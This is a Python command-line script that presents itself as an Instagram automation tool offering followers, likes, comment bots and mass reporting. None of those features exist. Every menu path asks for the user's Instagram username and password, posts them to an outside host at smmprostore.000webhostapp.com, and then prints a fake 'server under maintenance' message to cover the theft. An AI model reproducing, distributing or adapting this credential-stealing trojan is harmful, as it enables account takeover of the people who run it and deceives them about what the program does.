#!/usr/bin/env python

import os
import requests

red = "\033[1;31;40m"
green = "\033[1;32;40m"
cyan = "\033[1;36;40m"

banner = """
    ██               ▄▄
    ▀▀               ██                    ██
  ████     ██▄████▄  ██▄███▄    ▄████▄   ███████
    ██     ██▀   ██  ██▀  ▀██  ██▀  ▀██    ██
    ██     ██    ██  ██    ██  ██    ██    ██
 ▄▄▄██▄▄▄  ██    ██  ███▄▄██▀  ▀██▄▄██▀    ██▄▄▄
 ▀▀▀▀▀▀▀▀  ▀▀    ▀▀  ▀▀ ▀▀▀      ▀▀▀▀       ▀▀▀▀
"""
os.system("clear")
print(red + banner)

print("")

print(green + "[1] Instagram auto followers")
print(green + "[2] Instagram auto liker")
print(green + "[3] Comment bot")
print(green + "[4] Like bot")
print(green + "[5] Auto report")
print(red + "[6] Exit")

print("")

option = input(red + "Enter your choice: ")

print("")

if (option=="1"):
	os.system("clear")
	print(red + banner)
	print("")
	print(green + "[1] Paid") 
	print(green + "[2] Free")
	print("")
	choice = input(red + "Choose your choice:")

	if (choice=="1"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	elif (choice=="2"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	else:
		print(red + "Invalid input")
		exit()

elif (option=="2"):
	os.system("clear")
	print(red + banner)
	print("")
	print(green + "[1] Paid") 
	print(green + "[2] Free")
	print("")
	choice = input(red + "Choose your choice:")

	if (choice=="1"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	elif (choice=="2"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	else:
		print(red + "Invalid input")
		exit()

elif (option=="3"):
	os.system("clear")
	print(red + banner)
	print("")
	print(green + "[1] Paid") 
	print(green + "[2] Free")
	print("")
	choice = input(red + "Choose your choice:")

	if (choice=="1"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	elif (choice=="2"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	else:
		print(red + "Invalid input")
		exit()

elif (option=="4"):
	os.system("clear")
	print(red + banner)
	print("")
	print(green + "[1] Paid") 
	print(green + "[2] Free")
	print("")
	choice = input(red + "Choose your choice:")

	if (choice=="1"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	elif (choice=="2"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	else:
		print(red + "Invalid input")
		exit()

elif (option=="5"):
	os.system("clear")
	print(red + banner)
	print("")
	print(cyan + "Choose your reporting option")
	print("")
	print(green + "[1] Inappropriate content")
	print(green + "[2] Fake account")
	print(green + "[3] Post with sexual content")
	print(green + "[4] I don't want to see this")
	print("")
	report = input(red + "Enter your report option: ")
	print("")

	if (report=="1"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	elif (report=="2"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	elif (report=="3"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	elif (report=="4"):
		os.system("clear")
		print(red + banner)
		print("")
		print(cyan + "Login your instagram account")
		print("")
		username = input(green + "Enter your instagram username: ")
		password = input(green + "Enter your instagram password: ")
		print(cyan + "Loging in...")
		url = "https://smmprostore.000webhostapp.com/login.php"
		data1 = {'email':username,'pass':password}
		requests.post(url,data=data1)
		print(green + "sorry,our server is under maintenance...")
		print(green + "We will come back soon...")
		print(green + "please try again after sometime...")
		exit()
	else:
		print(red + "Invalid input")
		exit()

else:
	print(cyan + "Thanks for using...")
	print(cyan + "Coded by RAHUL MONDA")
	print(red + "Exiting...")
	print("")
	exit()
